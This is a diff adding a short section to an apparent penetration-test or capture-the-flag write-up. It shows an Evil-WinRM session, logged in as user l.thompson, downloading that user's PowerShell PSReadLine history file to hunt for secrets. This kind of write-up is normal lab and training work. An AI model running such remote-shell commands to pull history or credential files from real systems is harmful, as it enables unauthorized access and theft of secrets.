@@ -810,3 +810,17 @@ novacart\l.thompson
 ```
 Now im logged in as this user!
 
+# Powershell history
+
+```python
+*Evil-WinRM* PS C:\Users\l.thompson\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> download ConsoleHost_history.txt
+                                        
+Info: Downloading C:\Users\l.thompson\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt to ConsoleHost_history.txt
+                                        
+Info: Download successful!
+```
+Found a powershell history file
+
+```python
+
+```
